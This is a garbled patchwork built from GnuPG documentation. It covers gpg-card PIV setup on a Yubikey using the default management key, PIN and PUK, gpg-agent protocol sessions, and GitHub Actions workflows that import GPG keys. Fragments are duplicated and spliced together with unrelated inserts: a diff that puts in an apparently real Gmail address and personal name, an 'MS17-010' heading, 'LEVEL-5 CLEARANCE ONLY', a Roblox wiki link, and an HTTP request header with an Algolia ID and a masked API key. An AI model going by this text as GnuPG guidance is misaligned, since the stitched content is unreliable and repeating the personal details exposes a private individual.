+AUTHENTICATE [--setkey] [--raw] [< file]|key] +AUTH and set key + +GENERATE [--force] [--algo=algo{+algo2}] keyref +Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref + +LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶ +L + +READCERT [--openpgp] certref > file ¶ + +openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3" + +WRITECERT certref < file ¶ +WRITECERT --openpgp certref [< file|fpr] +WRITECERT --clear certref +Write a certificate to the card under the id certref. + +WRITEKEY [--force] keyref keygrip ¶ +Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key +—Shadowed + +YUBIKEY cmd args ¶ +Various commands pertaining to Yubikey tokens with cmd being: + +LIST +List supported and enabled Yubikey applications. + +ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] +DISABLE +Enable or disable the specified or all applications on the given interface. + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708. + +PIV + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708 + +the string gpg/card> is the prompt + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: D2760001240102010006090746250000 +Application type .: OpenPGP +Version ..........: 2.1 +[...] + +use help yubikey). + +use help yubikey) + +gpg/card> yubikey disable all opgp +gpg/card> yubikey list +Application USB NFC +----------------------- +OTP yes yes +U2F yes yes +OPGP no no +PIV yes no +OATH yes yes +FIDO2 yes yes +gpg/card> reset + +/.gnupg/scdaemon.conf + +application-priority piv + +scdaemon + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: [none]

 keyref .....: PIV.9A
+Card authenticat. : [none]

 keyref .....: PIV.9E
+Digital signature : [none]

 keyref .....: PIV.9C
+Key management ...: [none]

 keyref .....: PIV.9D
+In + +Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) + +Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key): + +gpg/card> auth 010203040506070801020304050607080102030405060708 + +gpg/card> auth < myauth.key + +gpg/card> generate --algo=nistp384 PIV.9A +PIV card no. yk-9074625 detected +gpg/card> generate --algo=nistp256 PIV.9E +PIV card no. yk-9074625 detected +gpg/card> generate --algo=rsa2048 PIV.9C +PIV card no. yk-9074625 detected + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D 
+—force + +$ gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +[...] +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <otto@example.net>
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/ + +$ gpgsm --learn +$ gpgsm --gen-key -o sign.crt +Please select what kind of key you want:

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 3 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 +Your selection? 3 +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 2 +Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) +These parameters are used:
Key-Type: card:PIV.9C
Key-Length: 1024
Key-Usage: sign
Serial: random
Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) y +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED +gpgsm: certificate created +Ready. +$ gpgsm --import sign.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writecert PIV.9C < sign.crt + +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - [verified] - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Signing key for yk-9074625,O=example,C=DE
   user id ..: <otto@example.net>
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <otto@example.net>
+PIV authentication’ key with ssh: + +$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) + +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:

(1) RSA and RSA (default)
(2) DSA and Elgamal
(3) DSA (sign only)
(4) RSA (sign only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 3 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: +Email address: otto@example.net +Comment: +You selected this USER-ID:

"otto@example.net"
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid otto@example.net +$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available. + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net +gpg> addkey +Secret parts of primary key are stored on-card. +Please select what kind of key you want:

(3) DSA (sign only)
(4) RSA (sign only)
(5) Elgamal (encrypt only)
(6) RSA (encrypt only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 4 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y +Really create? (y/N) y + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+ssb rsa2048/7067860A98FCE6E1

created: 2019-04-04  expires: never       usage: E
card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net + +gpg> save +Now you can use your PIV card also with gpg. +

diff --git a/ReadMe.md b/ReadMe.md index 7278f80..41b298d 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -709,7 +709,844 @@ Digital signature’ key gpg-card:

gpg/card> writecert PIV.9C < sign.crt +# MS17-010 +# 000006 +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - [verified] - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Signing key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.co
m> +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
PIV authentication’ key with ssh:
+$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) +ssh-add with the uppercase ‘-L +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:

(1) RSA and RSA (default)
(2) DSA and Elgamal
(3) DSA (sign only)
(4) RSA (sign only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 3 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: keith bieszczat +Email address: 6309304695z@gmail.com +Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator +You selected this USER-ID:

"6309304695z@gmail.com"
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid 6309304695z@gmail.com +

run gpg in --expert mode
$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available.
+sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net +gpg> addkey +Secret parts of primary key are stored on-card. +Please select what kind of key you want:

(3) DSA (sign only)
(4) RSA (sign only)
(5) Elgamal (encrypt only)
(6) RSA (encrypt only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 4 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y +Really create? (y/N) y + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+ssb rsa2048/7067860A98FCE6E1

created: 2019-04-04  expires: never       usage: E
card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net + +gpg> save + +/* 32A19-D90712
+LEVEL-5 CLEARANCE ONLY

‘--force’ +authentication key +-header-'010203040506070801020304050607080102030405060708' +SETDATA hexstring +to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command
PKSIGN keyid +where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:
PKSIGN --hash=algoname keyid +READKEY hexified_certid +READCERT hexified_certid|keyid +SERIALNO +Return the serial number of the card using a status response like:
S SERIALNO D27600000000000000000000
WRITEKEY [--force] keyid +SETDATA hexstring +to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command
PKDECRYPT keyid +CHECKPIN idstr +RESTART +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+./configure --sysconfdir=/etc --localstatedir=/va +CN=Wurzel ZS 3,O=Intevation GmbH,C=DE

A6935DD34EF3087973C706FC311AA2CCF733765B S
CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S
CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
  # Key added on: 2011-07-20 20:38:46
  # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
  34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
+private-keys-v1.d/ +gpg-connect-agent 'help COMMAND' /bye +SETKEY +Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available. +

PKDECRYPT +The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.
S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END +Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:
(enc-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency. + +If the decryption was successful the decrypted data is returned by means of "D" lines. + +Here is an example session: +

C: PKDECRYPT
S: INQUIRE CIPHERTEXT
C: D (enc-val elg (a 349324324)
C: D (b 3F444677CA)))
C: END
S: # session key follows
S: S PADDING 0
S: D (value 1234567890ABCDEF0)
S: OK decryption successful +The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has +SIGKEY +This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.
SETHASH --hash=| +sig-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+The operation is affected by the option +

OPTION use-cache-for-signing=0|1 +The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.
+Here is an example session: +

C: SIGKEY
S: OK key available
C: SIGKEY
S: OK key available
C: PKSIGN
S: # I did ask the user whether he really wants to sign
S: # I did ask the user for the passphrase
S: INQUIRE HASHVAL
C: D ABCDEF012345678901234
C: END
S: # signature follows
S: D (sig-val rsa (s 45435453654612121212))
S: OK
GENKEY [--no-protection] [--preset] [<cache_nonce>] +Invokes the key generation process and the server will then inquire on the generation parameters, like:
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END +The format of the key parameters which depends on the algorithm is of the form:
(genkey
 (algo
   (parameter_name_1 ....)
     ....
   (parameter_name_n ....)))
+If everything succeeds, the server returns the public key in a SPKI like S-Expression like this: +

(public-key
  (rsa
(n )
(e ))) +Here is an example session:
C: GENKEY
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END
S: D (public-key
S: D (rsa (n 326487324683264) (e 10001)))
S OK key created
ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> +LISTTRUSTED +GpgAgent returns a list of trusted keys line by line:
S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK +The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. +Ok +Finally a client should be able to mark a key as trusted:
MARKTRUSTED fingerprint "P"|"S" +The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
S: INQUIRE TRUSTDESC
C: D Do you trust the key with the fingerprint @FPR@
C: D bla fasel blurb.
C: END
S: OK +GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
            [--qualitybar] cache_id                \
            [error_message prompt description]
+PRESET_PASSPHRASE [--inquire] <string_or_keygrip> [] + +HAVEKEY keygrips

GET_CONFIRMATION description
LEARN [--send] +UPDATESTARTUPTTY +SETDATA hexstring
PKSIGN keyid
PKSIGN --hash=algoname keyid
+READCERT hexified_certid|keyid +READKEY hexified_certid +SETDATA hexstring +d +

PKSIGN keyid
LEARN
PKSIGN --hash=algoname keyid
+WRITEKEY [--force] keyid +WRITEKEY [--force] keyid +PASSWD [--reset] [--nullpin] chvno +CHECKPIN idstr +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +this: +

S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+--auto-key-import + +command --locate-external-key +command --locate-external-key +github/workflows/release.yml: +ldap://keys.(thedomain) +‘--auto-key-locate

--auto-key-locate +--auto-key-retrieve
honor-keyserver-url
+-sig-keyserver-url +--recv-key +honor-keyserver-url +--use-agent +--gpg-agent-info + + +--no-random-seed-file +Host: c7-use-3.algolianet. com +Accept: / +Sec-Fetch-Site: cross-site +Accept-Language: en-US, en; q=0.9 +Accept-Encoding: gzip, deflate, br +Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B +Origin: https://dashboard.algolia.com +User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe +x-algolia-api-key: b3cf*************************米** +Content-Length: 27 +Connection: keep-alive +Content-Type: application/x-www-form-urlencoded +Sec-Fetch-Dest: empty + +scdaemon.conf +1 +HKCU\Software\GNU\GnuPG:DefaultLogFile, +--debug-level level +HKCU\Software\GNU\GnuPG:DefaultLogFile, +scd-event +HKCU\Software\GNU\GnuPG:HomeDir +HKCU\Software\GNU\GnuPG:DefaultLogFile, +reader_n.status +HKCU\Software\GNU\GnuPG:HomeDir + +trustlist.txt file +gpg-agent.conf +HKCU\Software\GNU\GnuPG:HomeDir +name: release +debug-pinentry +--debug 1024 + +global trustlist (/usr/local/etc/gnupg/trustlist.tx + +Active cards +Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. +gpg-connect-agent updatestartuptty /bye +Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command: + +gpg-connect-agent /bye +--scdaemon-program filename +Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf +--check-passphrase-pattern file +--check-sym-passphrase-pattern file +Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) +bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe +Keys listed in the sshcontrol file +--disable-extended-key-format +These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched. + +--enable-ssh-support +--enable-win32-openssh-support +--enable-putty-support + +gpg-connect-agent 'GETINFO s2k_count' /bye +gpg-connect-agent 'GETINFO s2k_time' /bye +To view the auto-calibrated count use: + +gpg-connect-agent 'GETINFO s2k_count_cal' /bye +--ssh-fingerprint-digest +Keys listed in the sshcontrol file + +Active card +gpg-connect-agent /bye +bashrc or whatever initialization file is used for all shell invocations: + +GPG_TTY=$(tty) +export GPG_TTY +--daemon [command line] +server + +agent-program file ¶ +Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs. + +--gpg-program file +Specify a non-default gpg binary to be used by certain commands. + +--gpgsm-program file +Specify a non-default gpgsm binary to be used by certain commands. + +--chuid uid +Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows. + +gpg-card +AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ +AUTH +FETCH +GENERATE [--force] [--algo=algo{+algo2}] keyref +KDF-SETUP ¶ +Prepare the OpenPGP card KDF feature for this card. + +LANG [--clear] +Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info. + +LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] +NAME [--clear] +PRIVATEDO [--clear] n [< file] file +READCERT [--openpgp] certref > file ¶ +Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". +URL [--clear] +gpg's. --fetch +WRITECERT certref < file ¶ +WRITECERT --openpgp certref [< file|fpr] +WRITECERT --clear certref

--openpgp +file +fpr. +WRITEKEY [--force] keyref keygrip ¶ +Write a private key object identified by keygrip to the card under the id keyref. +CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ +Serial number +A hex-string with the serial number of the card.
+Type +This gives the type of the card’s application. For example "OpenPGP" or "PIV". + +Keygrip +A hex-string identifying a key. + +Keyref +The application slot where the key is stored on the card. For example "OpenPGP.1" + +Status +The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card. + +YUBIKEY cmd args +Various commands pertaining to Yubikey tokens with cmd being: + +LIST +List supported and enabled Yubikey applications. + +ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] +DISABLE +Enable or disable the specified or all applications on the given interface. + +The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit. + +GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708. + +PIV Application PIN +This is the string 123456. + +PIN Unblocking Key +This is the string 12345678. +list (the string gpg/card> +card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: D2760001240102010006090746250000 +Application type .: OpenPGP +Version ..........: 2.1 +[...] +on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
 - uses: actions/checkout@v3
 - uses: cli/gh-extension-precompile@v1
   with:
     go_version: "1.16"
+Then +- uses: cli/gh-extension-precompile@v1

env:
CGO_ENABLED: 1 +- uses: cli/gh-extension-precompile@v1
with:
build_script_override: "script/build.sh" +name: release
+on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
 - uses: actions/checkout@v3
 - id: import_gpg
   uses: crazy-max/ghaction-import-gpg@v5
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.GPG_PASSPHRASE }}
 - uses: cli/gh-extension-precompile@v1
   with:
     gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
+# macOS +gpg --armor --export-secret-key joe@foo.bar | pbcopy + +# Ubuntu (assuming GNU base64) +gpg --armor --export-secret-key joe@foo.bar -w0 | xclip + +# Arch +gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i + +# FreeBSD (assuming BSD base64) +gpg --armor --export-secret-key joe@foo.bar | xclip + +name: import-gpg + +on:

push:
branches: master
+jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
 -
   name: List keys
   run: gpg -K
+name: import-gpg + +on:

push:
branches: master
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
     fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
 -
   name: List keys
   run: gpg -K
+pub ed25519 2021-09-24 [C]

 87F257B89CE462100BEC0FFE6071D218380FDCC8
 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
+uid [ unknown] Joe Bar joe@bar.foo +sub ed25519 2021-09-24 [S]

 C17D11ADF199F12A30A0910F1F80449BE0B08CB8
 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
